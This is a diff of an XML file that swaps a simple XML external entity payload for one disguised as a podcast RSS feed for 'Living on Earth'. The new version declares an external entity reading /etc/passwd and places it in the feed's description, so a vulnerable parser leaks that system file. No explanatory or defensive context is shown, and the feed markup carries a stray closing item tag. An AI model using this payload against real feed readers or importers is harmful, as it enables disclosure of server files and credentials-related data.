@@ -1,6 +1,25 @@
-<?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [ 
-    <!ELEMENT foo ANY >
-    <!ENTITY xxe SYSTEM "index.php" >
-]>
-<foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE title [ <!ELEMENT title ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<rss xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+
+<channel>
+<title>PRI: Living on Earth</title>
+<link>http://www.loe.org/</link>
+<language>en-us</language>
+<copyright>&#x2117; &amp; &#xA9; 2011 World Media Foundation</copyright>
+<itunes:subtitle>Sound Journalism for the Whole Planet</itunes:subtitle>
+<itunes:author>Living on Earth</itunes:author>
+<itunes:summary>123</itunes:summary>
+<description>&xxe;</description>
+<itunes:owner>
+  <itunes:name>World Media Foundation</itunes:name>
+  <itunes:email>webmaster@loe.org</itunes:email>
+</itunes:owner>
+<itunes:image href="http://www.loe.org/images/loe600x600.jpg" />
+<itunes:category text="News &amp; Politics"/>
+<itunes:explicit>no</itunes:explicit>
+<atom:link href="http://www.loe.org/podcast.rss" rel="self" type="application/rss+xml" />
+</item>
+</channel>
+</rss>
